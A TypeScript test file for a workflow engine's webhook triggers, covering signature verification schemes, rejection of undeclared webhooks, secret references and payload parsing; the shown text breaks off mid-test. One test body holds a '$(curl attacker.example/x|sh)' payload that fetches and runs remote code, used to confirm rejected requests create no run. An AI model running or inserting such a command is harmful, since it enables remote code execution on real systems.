import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import crypto from "node:crypto";
import { unlink } from "node:fs/promises";
import { z } from "zod";
import {
  closeDb,
  createWorkflow,
  getWorkflowRun,
  initDb,
  updateWorkflow,
  upsertSwarmConfig,
} from "../be/db";
import type { Workflow } from "../types";
import { TriggerConfigSchema } from "../types";
import { startWorkflowExecution } from "../workflows/engine";
import { BaseExecutor, type ExecutorResult } from "../workflows/executors/base";
import { ExecutorRegistry } from "../workflows/executors/registry";
import {
  decodeStandardWebhookSecret,
  handleEventTrigger,
  handleWebhookTrigger,
  logOpenWebhookTriggers,
  verifyHmacSignature,
  verifyStandardWebhookSignature,
  verifyTimestampedHmacSignature,
  verifyTokenEquality,
  WebhookError,
} from "../workflows/triggers";

const TEST_DB_PATH = "./test-workflow-triggers-v2.sqlite";

const secretRef = (name: string): string => `secret.${name}`;

// ─── Test Executor ──────────────────────────────────────────

class NoopExecutor extends BaseExecutor<typeof NoopExecutor.schema, typeof NoopExecutor.outSchema> {
  static readonly schema = z.object({
    channel: z.string().optional(),
    template: z.string().optional(),
  });
  static readonly outSchema = z.object({ sent: z.boolean() });

  readonly type = "notify";
  readonly mode = "instant" as const;
  readonly configSchema = NoopExecutor.schema;
  readonly outputSchema = NoopExecutor.outSchema;

  protected async execute(): Promise<ExecutorResult<z.infer<typeof NoopExecutor.outSchema>>> {
    return { status: "success", output: { sent: true } };
  }
}

// ─── Setup ──────────────────────────────────────────────────

let registry: ExecutorRegistry;

beforeAll(() => {
  initDb(TEST_DB_PATH);
  registry = new ExecutorRegistry();
  registry.register(new NoopExecutor());
});

afterAll(async () => {
  closeDb();
  await unlink(TEST_DB_PATH).catch(() => {});
  await unlink(`${TEST_DB_PATH}-wal`).catch(() => {});
  await unlink(`${TEST_DB_PATH}-shm`).catch(() => {});
});

// ─── Helpers ────────────────────────────────────────────────

async function makeWorkflow(
  overrides?: Partial<Parameters<typeof createWorkflow>[0]>,
): Promise<Workflow> {
  return createWorkflow({
    name: `test-wf-${crypto.randomUUID().slice(0, 8)}`,
    definition: {
      nodes: [
        {
          id: "n1",
          type: "notify",
          config: { channel: "swarm", template: "test" },
        },
      ],
    },
    ...overrides,
  });
}

// ─── HMAC Verification ──────────────────────────────────────

describe("verifyHmacSignature", () => {
  const secret = "example-test-secret-123";
  const body = '{"event":"test"}';

  test("valid sha256=<hex> signature passes", () => {
    const hmac = crypto.createHmac("sha256", secret);
    hmac.update(body);
    const sig = `sha256=${hmac.digest("hex")}`;

    expect(verifyHmacSignature(secret, body, sig)).toBe(true);
  });

  test("valid raw hex signature passes", () => {
    const hmac = crypto.createHmac("sha256", secret);
    hmac.update(body);
    const sig = hmac.digest("hex");

    expect(verifyHmacSignature(secret, body, sig)).toBe(true);
  });

  test("invalid signature fails", () => {
    expect(verifyHmacSignature(secret, body, "sha256=invalid")).toBe(false);
  });

  test("wrong secret fails", () => {
    const hmac = crypto.createHmac("sha256", "wrong-secret");
    hmac.update(body);
    const sig = `sha256=${hmac.digest("hex")}`;

    expect(verifyHmacSignature(secret, body, sig)).toBe(false);
  });

  test("empty signature fails", () => {
    expect(verifyHmacSignature(secret, body, "")).toBe(false);
  });
});

describe("verifyTimestampedHmacSignature", () => {
  const secret = "example-timestamped-secret";
  const body = '{"event":"finding.triage_completed"}';
  const timestamp = 1_700_000_000;
  const nowMs = timestamp * 1000;

  function sign(ts: number, signingSecret = secret): string {
    return crypto.createHmac("sha256", signingSecret).update(`${ts}.${body}`).digest("hex");
  }

  test("valid timestamped signature passes", () => {
    const header = `t=${timestamp},v1=${sign(timestamp)}`;

    expect(verifyTimestampedHmacSignature(secret, body, header, {}, nowMs)).toBe(true);
  });

  test("wrong secret fails", () => {
    const header = `t=${timestamp},v1=${sign(timestamp, "wrong-secret")}`;

    expect(verifyTimestampedHmacSignature(secret, body, header, {}, nowMs)).toBe(false);
  });

  test("expired timestamp fails", () => {
    const oldTimestamp = timestamp - 301;
    const header = `t=${oldTimestamp},v1=${sign(oldTimestamp)}`;

    expect(verifyTimestampedHmacSignature(secret, body, header, {}, nowMs)).toBe(false);
  });

  test("future timestamp beyond tolerance fails", () => {
    const futureTimestamp = timestamp + 301;
    const header = `t=${futureTimestamp},v1=${sign(futureTimestamp)}`;

    expect(verifyTimestampedHmacSignature(secret, body, header, {}, nowMs)).toBe(false);
  });

  test("missing or garbled timestamp fails", () => {
    expect(verifyTimestampedHmacSignature(secret, body, `v1=${sign(timestamp)}`, {}, nowMs)).toBe(
      false,
    );
    expect(
      verifyTimestampedHmacSignature(
        secret,
        body,
        `t=not-a-number,v1=${sign(timestamp)}`,
        {},
        nowMs,
      ),
    ).toBe(false);
  });

  test("multiple signature entries pass when any one matches", () => {
    const header = `t=${timestamp},v1=deadbeef,v1=${sign(timestamp)}`;

    expect(verifyTimestampedHmacSignature(secret, body, header, {}, nowMs)).toBe(true);
  });

  test("custom timestamp and signature keys are supported", () => {
    const header = `ts=${timestamp},sig=${sign(timestamp)}`;

    expect(
      verifyTimestampedHmacSignature(
        secret,
        body,
        header,
        { timestampKey: "ts", signatureKey: "sig", toleranceSeconds: 300 },
        nowMs,
      ),
    ).toBe(true);
  });
});

describe("verifyTokenEquality", () => {
  test("matching token passes", () => {
    expect(verifyTokenEquality("shared-token", "shared-token")).toBe(true);
  });

  test("same-length non-matching token fails", () => {
    expect(verifyTokenEquality("shared-token", "shared-tokem")).toBe(false);
  });

  test("wrong-length non-matching token fails without throwing", () => {
    expect(() => verifyTokenEquality("shared-token", "short")).not.toThrow();
    expect(verifyTokenEquality("shared-token", "short")).toBe(false);
  });
});

// Official vector from github.com/standard-webhooks/standard-webhooks
// (libraries/javascript/src/webhook.test.ts, "sign function works").
const SW_SECRET = "MfKQ9r8GKYqrTwjUPD8ILPZIo2LaLaSw";
const SW_MSG_ID = "msg_p5jXN8AQM9LWM0D4loKWxJek";
const SW_TIMESTAMP = 1614265330;
const SW_PAYLOAD = '{"test": 2432232314}';
const SW_EXPECTED_SIGNATURE = "v1,g0hM9SsE+OTPJTGt/tmIKtSyZlE3uFJELVlNIOLJ1OE=";

function signStandardWebhook(secret: string, id: string, timestamp: number, body: string): string {
  const key = Buffer.from(secret.replace(/^whsec_/, ""), "base64");
  const digest = crypto.createHmac("sha256", key).update(`${id}.${timestamp}.${body}`);
  return `v1,${digest.digest("base64")}`;
}

describe("verifyStandardWebhookSignature", () => {
  const key = decodeStandardWebhookSecret(SW_SECRET)!;
  const nowMs = SW_TIMESTAMP * 1000;
  const headers = (signature: string, timestamp = SW_TIMESTAMP) => ({
    id: SW_MSG_ID,
    timestamp: String(timestamp),
    signature,
  });

  test("official test vector passes", () => {
    expect(signStandardWebhook(SW_SECRET, SW_MSG_ID, SW_TIMESTAMP, SW_PAYLOAD)).toBe(
      SW_EXPECTED_SIGNATURE,
    );
    expect(
      verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(SW_EXPECTED_SIGNATURE), {}, nowMs),
    ).toBe(true);
  });

  test("secret decodes the same with and without the whsec_ prefix", () => {
    expect(decodeStandardWebhookSecret(`whsec_${SW_SECRET}`)).toEqual(key);
    expect(
      verifyStandardWebhookSignature(
        decodeStandardWebhookSecret(`whsec_${SW_SECRET}`)!,
        SW_PAYLOAD,
        headers(SW_EXPECTED_SIGNATURE),
        {},
        nowMs,
      ),
    ).toBe(true);
  });

  test("invalid or empty secrets decode to null", () => {
    expect(decodeStandardWebhookSecret("whsec_")).toBeNull();
    expect(decodeStandardWebhookSecret("")).toBeNull();
    expect(decodeStandardWebhookSecret("not base64!")).toBeNull();
  });

  test("tampered body fails", () => {
    expect(
      verifyStandardWebhookSignature(
        key,
        '{"test": 2432232315}',
        headers(SW_EXPECTED_SIGNATURE),
        {},
        nowMs,
      ),
    ).toBe(false);
  });

  test("re-serialized JSON body fails (verification is over raw bytes)", () => {
    const reserialized = JSON.stringify(JSON.parse(SW_PAYLOAD));
    expect(
      verifyStandardWebhookSignature(key, reserialized, headers(SW_EXPECTED_SIGNATURE), {}, nowMs),
    ).toBe(false);
  });

  test("wrong secret fails", () => {
    const wrong = decodeStandardWebhookSecret(Buffer.alloc(24, 7).toString("base64"))!;
    expect(
      verifyStandardWebhookSignature(wrong, SW_PAYLOAD, headers(SW_EXPECTED_SIGNATURE), {}, nowMs),
    ).toBe(false);
  });

  test("tampered webhook-id fails", () => {
    expect(
      verifyStandardWebhookSignature(
        key,
        SW_PAYLOAD,
        { ...headers(SW_EXPECTED_SIGNATURE), id: "msg_other" },
        {},
        nowMs,
      ),
    ).toBe(false);
  });

  test("stale timestamp beyond the default 5 minute tolerance fails", () => {
    const stale = SW_TIMESTAMP - 301;
    const signature = signStandardWebhook(SW_SECRET, SW_MSG_ID, stale, SW_PAYLOAD);
    expect(
      verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(signature, stale), {}, nowMs),
    ).toBe(false);
    const edge = SW_TIMESTAMP - 300;
    const edgeSignature = signStandardWebhook(SW_SECRET, SW_MSG_ID, edge, SW_PAYLOAD);
    expect(
      verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(edgeSignature, edge), {}, nowMs),
    ).toBe(true);
  });

  test("future timestamp beyond tolerance fails", () => {
    const future = SW_TIMESTAMP + 301;
    const signature = signStandardWebhook(SW_SECRET, SW_MSG_ID, future, SW_PAYLOAD);
    expect(
      verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(signature, future), {}, nowMs),
    ).toBe(false);
  });

  test("custom toleranceSeconds is honored", () => {
    const stale = SW_TIMESTAMP - 600;
    const signature = signStandardWebhook(SW_SECRET, SW_MSG_ID, stale, SW_PAYLOAD);
    expect(
      verifyStandardWebhookSignature(
        key,
        SW_PAYLOAD,
        headers(signature, stale),
        { toleranceSeconds: 900 },
        nowMs,
      ),
    ).toBe(true);
  });

  test("garbled timestamp fails", () => {
    expect(
      verifyStandardWebhookSignature(
        key,
        SW_PAYLOAD,
        { ...headers(SW_EXPECTED_SIGNATURE), timestamp: "not-a-number" },
        {},
        nowMs,
      ),
    ).toBe(false);
  });

  test("multiple signatures pass when one v1 entry matches", () => {
    const list = [
      "v1,Ceo5qEr07ixe2NLpvHk3FH9bwy/WavXrAFQ/9tdO6mc=",
      "v2,Ceo5qEr07ixe2NLpvHk3FH9bwy/WavXrAFQ/9tdO6mc=",
      SW_EXPECTED_SIGNATURE,
      "v1a,hnO3f9T8Ytu9HwrXslvumlUpqtNVqkhqw/enGzPCXe5BdqzCInXqYXFymVJaA7AZdpXwVLPo3mNl8EM+m7TBAg==",
    ].join(" ");
    expect(verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(list), {}, nowMs)).toBe(true);
  });

  test("a matching digest under a non-v1 version fails", () => {
    const digest = SW_EXPECTED_SIGNATURE.slice("v1,".length);
    expect(
      verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(`v2,${digest}`), {}, nowMs),
    ).toBe(false);
    expect(verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(digest), {}, nowMs)).toBe(false);
  });

  test("empty or partial signatures fail without throwing", () => {
    for (const signature of ["", "v1,", "v1,dawfeoifkpqwoekfpqoekf", "v1"]) {
      expect(verifyStandardWebhookSignature(key, SW_PAYLOAD, headers(signature), {}, nowMs)).toBe(
        false,
      );
    }
  });
});

// ─── Webhook Trigger ────────────────────────────────────────

describe("handleWebhookTrigger", () => {
  test("valid HMAC starts workflow", async () => {
    const secret = "example-my-webhook-secret";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret }],
    });

    const body = '{"event":"deploy"}';
    const hmac = crypto.createHmac("sha256", secret);
    hmac.update(body);
    const sig = `sha256=${hmac.digest("hex")}`;

    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-hub-signature-256": sig },
      registry,
    );

    expect(result.runId).toBeDefined();
    expect(typeof result.runId).toBe("string");

    // Verify the run was created
    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
    expect(run!.workflowId).toBe(workflow.id);
  });

  test("invalid HMAC rejects with 401", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: "example-secret-123" }],
    });

    try {
      await handleWebhookTrigger(
        workflow.id,
        '{"test":true}',
        { "x-hub-signature-256": "sha256=invalid" },
        registry,
      );
      expect(true).toBe(false); // Should not reach here
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });

  test("missing signature rejects with 401 when hmacSecret is set", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: "example-secret-xyz" }],
    });

    try {
      await handleWebhookTrigger(workflow.id, '{"test":true}', {}, registry);
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });

  test("no hmacSecret configured accepts any request (open webhook trigger is a supported opt-in)", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook" }],
    });

    const result = await handleWebhookTrigger(workflow.id, '{"data":"hello"}', {}, registry);

    expect(result.runId).toBeDefined();
    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
  });

  test("workflow with NO webhook trigger declared is rejected with 404 (superagent c27edfd7 / b132d7c5)", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "schedule", scheduleId: crypto.randomUUID() }],
    });

    try {
      await handleWebhookTrigger(workflow.id, '{"data":"hello"}', {}, registry);
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(404);
      expect((err as WebhookError).message).toContain("does not declare a webhook trigger");
    }
  });

  test("workflow with NO webhook trigger declared: rejected request never creates a run", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "schedule", scheduleId: crypto.randomUUID() }],
    });
    const { countWorkflowRuns } = await import("../be/db");
    const before = await countWorkflowRuns(workflow.id);

    await handleWebhookTrigger(
      workflow.id,
      '{"pwn":"$(curl attacker.example/x|sh)"}',
      {},
      registry,
    ).catch(() => {});

    expect(await countWorkflowRuns(workflow.id)).toBe(before);
  });

  test("workflow with an empty triggers[] is rejected — manual-only workflows are not webhook-startable", async () => {
    const workflow = await makeWorkflow({ triggers: [] });

    try {
      await handleWebhookTrigger(workflow.id, "{}", {}, registry);
      expect(true).toBe(false);
    } catch (err) {
      expect((err as WebhookError).statusCode).toBe(404);
    }
  });

  test("alreadyAuthenticated bypasses the declared-trigger gate for pre-verified integration callers", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "schedule", scheduleId: crypto.randomUUID() }],
    });

    const result = await handleWebhookTrigger(workflow.id, '{"data":"hi"}', {}, registry, {
      alreadyAuthenticated: true,
    });

    expect(result.runId).toBeDefined();
  });

  test("workflow not found returns 404", async () => {
    try {
      await handleWebhookTrigger("00000000-0000-0000-0000-000000000000", "{}", {}, registry);
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(404);
    }
  });

  test("disabled workflow returns 400", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook" }],
    });
    // Disable the workflow
    await updateWorkflow(workflow.id, { enabled: false });

    try {
      await handleWebhookTrigger(workflow.id, "{}", {}, registry);
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(400);
    }
  });
});

// ─── Custom HMAC header + secret refs ───────────────────────

describe("handleWebhookTrigger — custom hmacHeader", () => {
  function signRaw(secret: string, body: string): string {
    return crypto.createHmac("sha256", secret).update(body).digest("hex");
  }

  test("custom hmacHeader (X-Webhook-Signature) is picked up and verified", async () => {
    const secret = "example-kapso-secret";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret, hmacHeader: "X-Webhook-Signature" }],
    });

    const body = '{"event":"message"}';
    // Kapso-style: raw hex, no `sha256=` prefix.
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-webhook-signature": signRaw(secret, body) },
      registry,
    );

    expect(result.runId).toBeDefined();
    expect(await getWorkflowRun(result.runId)).not.toBeNull();
  });

  test("custom hmacHeader lookup is case-insensitive", async () => {
    const secret = "example-kapso-secret-ci";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret, hmacHeader: "X-Webhook-Signature" }],
    });

    const body = '{"event":"ci"}';
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "X-Webhook-Signature": signRaw(secret, body) },
      registry,
    );

    expect(result.runId).toBeDefined();
  });

  test("signature on a non-configured header is rejected as missing", async () => {
    const secret = "example-kapso-secret-2";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret, hmacHeader: "X-Webhook-Signature" }],
    });

    const body = '{"event":"x"}';
    // Use a header that is neither the configured one nor a known fallback.
    try {
      await handleWebhookTrigger(
        workflow.id,
        body,
        { "x-some-other-header": signRaw(secret, body) },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });

  test("fallback header (x-signature) still works without explicit hmacHeader", async () => {
    const secret = "example-fallback-secret";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret }],
    });

    const body = '{"event":"fallback"}';
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-signature": signRaw(secret, body) },
      registry,
    );

    expect(result.runId).toBeDefined();
  });

  test("default X-Hub-Signature-256 path still works (no regression)", async () => {
    const secret = "example-default-header-secret";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret }],
    });

    const body = '{"event":"default"}';
    const sig = `sha256=${signRaw(secret, body)}`;
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-hub-signature-256": sig },
      registry,
    );

    expect(result.runId).toBeDefined();
  });

  test("explicit hmac-sha256 verification does not use fallback headers", async () => {
    const secret = "example-explicit-hmac-secret";
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: secret,
          verification: { format: "hmac-sha256", header: "X-Primary-Signature" },
        },
      ],
    });

    const body = '{"event":"explicit"}';
    try {
      await handleWebhookTrigger(
        workflow.id,
        body,
        { "x-signature": signRaw(secret, body) },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });
});

describe("handleWebhookTrigger — verification formats", () => {
  function signTimestamped(secret: string, body: string, timestamp: number): string {
    return crypto.createHmac("sha256", secret).update(`${timestamp}.${body}`).digest("hex");
  }

  test("timestamped-hmac-sha256 starts workflow for Superagent-shaped request", async () => {
    const secret = "example-superagent-secret";
    const timestamp = Math.floor(Date.now() / 1000);
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: secret,
          verification: {
            format: "timestamped-hmac-sha256",
            header: "X-Superagent-Signature",
            toleranceSeconds: 300,
          },
        },
      ],
    });

    const body = '{"type":"finding.triage_completed","finding":{"id":"finding-123"}}';
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      {
        "x-superagent-signature": `t=${timestamp},v1=${signTimestamped(secret, body, timestamp)}`,
      },
      registry,
    );

    expect(result.runId).toBeDefined();
    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
    expect(run!.triggerData).toEqual({
      type: "finding.triage_completed",
      finding: { id: "finding-123" },
    });
  });

  test("timestamped-hmac-sha256 rejects signatures on fallback headers", async () => {
    const secret = "example-timestamped-no-fallback-secret";
    const timestamp = Math.floor(Date.now() / 1000);
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: secret,
          verification: {
            format: "timestamped-hmac-sha256",
            header: "X-Superagent-Signature",
          },
        },
      ],
    });

    const body = '{"event":"fallback-blocked"}';
    try {
      await handleWebhookTrigger(
        workflow.id,
        body,
        { "x-signature": `t=${timestamp},v1=${signTimestamped(secret, body, timestamp)}` },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });

  test("token-equality starts workflow when shared token matches", async () => {
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: "example-gitlab-token",
          verification: { format: "token-equality", header: "X-Gitlab-Token" },
        },
      ],
    });

    const result = await handleWebhookTrigger(
      workflow.id,
      '{"event":"push"}',
      { "x-gitlab-token": "example-gitlab-token" },
      registry,
    );

    expect(result.runId).toBeDefined();
  });

  test("token-equality rejects a wrong token", async () => {
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: "example-gitlab-token",
          verification: { format: "token-equality", header: "X-Gitlab-Token" },
        },
      ],
    });

    try {
      await handleWebhookTrigger(
        workflow.id,
        '{"event":"push"}',
        { "x-gitlab-token": "wrong-token" },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(401);
    }
  });

  describe("standard-webhooks", () => {
    const secret = `whsec_${Buffer.alloc(32, 3).toString("base64")}`;

    async function makeStandardWorkflow(hmacSecret = secret): Promise<Workflow> {
      return makeWorkflow({
        triggers: [{ type: "webhook", hmacSecret, verification: { format: "standard-webhooks" } }],
      });
    }

    function standardHeaders(body: string, signingSecret = secret): Record<string, string> {
      const id = `msg_${crypto.randomUUID()}`;
      const timestamp = Math.floor(Date.now() / 1000);
      return {
        "webhook-id": id,
        "webhook-timestamp": String(timestamp),
        "webhook-signature": signStandardWebhook(signingSecret, id, timestamp, body),
      };
    }

    async function expectRejected(
      workflowId: string,
      body: string,
      headers: Record<string, string>,
      statusCode: number,
    ): Promise<void> {
      try {
        await handleWebhookTrigger(workflowId, body, headers, registry);
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(WebhookError);
        expect((err as WebhookError).statusCode).toBe(statusCode);
      }
    }

    test("starts the workflow for a correctly signed request", async () => {
      const workflow = await makeStandardWorkflow();
      const body = '{"event_type":"note.updated", "data": {"id":"not_123"}}';

      const result = await handleWebhookTrigger(workflow.id, body, standardHeaders(body), registry);

      const run = await getWorkflowRun(result.runId);
      expect(run!.triggerData).toEqual({ event_type: "note.updated", data: { id: "not_123" } });
    });

    test("accepts a secret stored without the whsec_ prefix and mixed-case headers", async () => {
      const workflow = await makeStandardWorkflow(secret.slice("whsec_".length));
      const body = '{"event":"plain-secret"}';
      const headers = standardHeaders(body);

      const result = await handleWebhookTrigger(
        workflow.id,
        body,
        {
          "Webhook-Id": headers["webhook-id"]!,
          "Webhook-Timestamp": headers["webhook-timestamp"]!,
          "Webhook-Signature": headers["webhook-signature"]!,
        },
        registry,
      );

      expect(result.runId).toBeDefined();
    });

    test("resolves a secret.NAME reference", async () => {
      const name = `SW_SECRET_${crypto.randomUUID().slice(0, 8).toUpperCase()}`;
      await upsertSwarmConfig({ scope: "global", key: name, value: secret, isSecret: true });
      const workflow = await makeStandardWorkflow(secretRef(name));
      const body = '{"event":"secret-ref"}';

      const result = await handleWebhookTrigger(workflow.id, body, standardHeaders(body), registry);

      expect(result.runId).toBeDefined();
    });

    test("rejects a tampered body", async () => {
      const workflow = await makeStandardWorkflow();
      const headers = standardHeaders('{"event":"original"}');
      await expectRejected(workflow.id, '{"event":"tampered"}', headers, 401);
    });

    test("rejects a signature made with a different secret", async () => {
      const workflow = await makeStandardWorkflow();
      const body = '{"event":"wrong-secret"}';
      const other = `whsec_${Buffer.alloc(32, 9).toString("base64")}`;
      await expectRejected(workflow.id, body, standardHeaders(body, other), 401);
    });

    test("rejects stale and future timestamps", async () => {
      const workflow = await makeStandardWorkflow();
      const body = '{"event":"replay"}';
      const now = Math.floor(Date.now() / 1000);
      for (const timestamp of [now - 3600, now + 3600]) {
        await expectRejected(
          workflow.id,
          body,
          {
            "webhook-id": "msg_replay",
            "webhook-timestamp": String(timestamp),
            "webhook-signature": signStandardWebhook(secret, "msg_replay", timestamp, body),
          },
          401,
        );
      }
    });

    test("rejects a request missing any required header", async () => {
      const workflow = await makeStandardWorkflow();
      const body = '{"event":"missing-header"}';
      const headers = standardHeaders(body);
      for (const name of ["webhook-id", "webhook-timestamp", "webhook-signature"]) {
        const partial = { ...headers };
        delete partial[name];
        await expectRejected(workflow.id, body, partial, 401);
      }
    });

    test("ignores signatures on legacy fallback headers", async () => {
      const workflow = await makeStandardWorkflow();
      const body = '{"event":"fallback"}';
      const { "webhook-signature": signature, ...rest } = standardHeaders(body);
      await expectRejected(workflow.id, body, { ...rest, "x-webhook-signature": signature! }, 401);
    });

    test("fails closed with 500 when the configured secret is not base64", async () => {
      const workflow = await makeStandardWorkflow("whsec_not base64!");
      const body = '{"event":"bad-secret"}';
      await expectRejected(workflow.id, body, standardHeaders(body), 500);
    });
  });

  test("verification configured without hmacSecret fails closed instead of accepting the request", async () => {
    // Bypasses the create/update Zod schema (which now also rejects this shape) to
    // exercise the runtime guard directly — e.g. for data written before this fix,
    // or any future write path that skips schema validation.
    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          verification: { format: "token-equality", header: "X-Gitlab-Token" },
        },
      ],
    });

    try {
      await handleWebhookTrigger(
        workflow.id,
        '{"event":"push"}',
        { "x-gitlab-token": "anything" },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(500);
    }
  });
});

describe("handleWebhookTrigger — hmacSecret references", () => {
  function signRaw(secret: string, body: string): string {
    return crypto.createHmac("sha256", secret).update(body).digest("hex");
  }

  test("hmacSecret as secret.NAME ref resolves and verifies", async () => {
    const SECRET_VALUE = "resolved-kapso-hmac-value";
    await upsertSwarmConfig({
      scope: "global",
      key: "TEST_KAPSO_WEBHOOK_HMAC_SECRET",
      value: SECRET_VALUE,
      isSecret: true,
    });

    const workflow = await makeWorkflow({
      triggers: [
        {
          type: "webhook",
          hmacSecret: secretRef("TEST_KAPSO_WEBHOOK_HMAC_SECRET"),
          hmacHeader: "X-Webhook-Signature",
        },
      ],
    });

    const body = '{"event":"secret-ref"}';
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-webhook-signature": signRaw(SECRET_VALUE, body) },
      registry,
    );

    expect(result.runId).toBeDefined();
    expect(await getWorkflowRun(result.runId)).not.toBeNull();
  });

  test("unresolvable secret.NAME ref fails cleanly with a WebhookError", async () => {
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secretRef("NONEXISTENT_HMAC_SECRET_12345") }],
    });

    const body = '{"event":"missing-secret"}';
    try {
      await handleWebhookTrigger(
        workflow.id,
        body,
        { "x-hub-signature-256": "deadbeef" },
        registry,
      );
      expect(true).toBe(false);
    } catch (err) {
      expect(err).toBeInstanceOf(WebhookError);
      expect((err as WebhookError).statusCode).toBe(500);
    }
  });

  test("a literal hmacSecret is not treated as a reference", async () => {
    const secret = `plain.${"literal-not-a-ref"}`;
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret }],
    });

    const body = '{"event":"literal"}';
    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-hub-signature-256": signRaw(secret, body) },
      registry,
    );

    expect(result.runId).toBeDefined();
  });
});

// ─── Trigger payload JSON parsing ───────────────────────────

describe("handleWebhookTrigger — triggerData JSON parsing", () => {
  function signRaw(secret: string, body: string): string {
    return crypto.createHmac("sha256", secret).update(body).digest("hex");
  }

  test("JSON body is parsed and run.triggerData is a deep-equal object", async () => {
    const workflow = await makeWorkflow({ triggers: [{ type: "webhook" }] });
    const payload = {
      message: { from: "+34000111222", text: "hi" },
      conversation: { id: "conv-abc-123" },
    };
    const body = JSON.stringify(payload);

    const result = await handleWebhookTrigger(workflow.id, body, {}, registry);

    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
    expect(run!.triggerData).toEqual(payload);
    // Deep paths must be reachable (this is what `{{trigger.message.from}}` needs).
    expect((run!.triggerData as { message: { from: string } }).message.from).toBe("+34000111222");
  });

  test("signed JSON body: HMAC verified against raw bytes, triggerData parsed to object", async () => {
    const secret = "example-kapso-deep-secret";
    const workflow = await makeWorkflow({
      triggers: [{ type: "webhook", hmacSecret: secret, hmacHeader: "X-Webhook-Signature" }],
    });
    // Use whitespace + unsorted keys so any re-serialization would change the bytes.
    const body = '{ "message": {"from":"+1","text":"hi"},  "id":"x" }';
    const sig = signRaw(secret, body);

    const result = await handleWebhookTrigger(
      workflow.id,
      body,
      { "x-webhook-signature": sig },
      registry,
    );

    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
    expect(run!.triggerData).toEqual({ message: { from: "+1", text: "hi" }, id: "x" });
  });

  test("non-JSON body falls back to the raw string and does not throw", async () => {
    const workflow = await makeWorkflow({ triggers: [{ type: "webhook" }] });
    const body = "this is not json at all";

    const result = await handleWebhookTrigger(workflow.id, body, {}, registry);

    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
    expect(run!.triggerData).toBe(body);
  });

  test("empty body produces a run without throwing", async () => {
    const workflow = await makeWorkflow({ triggers: [{ type: "webhook" }] });

    const result = await handleWebhookTrigger(workflow.id, "", {}, registry);

    expect(result.runId).toBeDefined();
    const run = await getWorkflowRun(result.runId);
    expect(run).not.toBeNull();
  });
});

// ─── Manual Trigger ─────────────────────────────────────────

describe("manual trigger (startWorkflowExecution)", () => {
  test("always available — workflow starts without triggers", async () => {
    const workflow = await makeWorkflow();

    const runId = await startWorkflowExecution(workflow, { manual: true }, registry);

